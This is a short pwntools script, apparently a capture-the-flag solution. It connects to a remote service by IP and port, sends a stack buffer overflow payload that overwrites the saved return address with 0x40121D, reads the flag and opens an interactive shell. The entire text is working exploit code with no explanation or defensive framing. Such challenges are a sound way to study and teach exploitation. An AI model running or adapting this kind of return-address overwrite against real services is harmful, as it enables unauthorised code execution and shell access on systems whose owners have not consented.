from pwn import *

conn = remote("119.3.83.106", 10343)
print(conn.readline())
payload = b'1' * 64 + b"saveaddr" + p64(0x000000000040121D)
conn.sendline(b"0")
print(conn.readline())
conn.sendline(payload)
# print(conn.readline())
conn.sendline(b"cat flag")
# print(conn.readline())
conn.interactive()

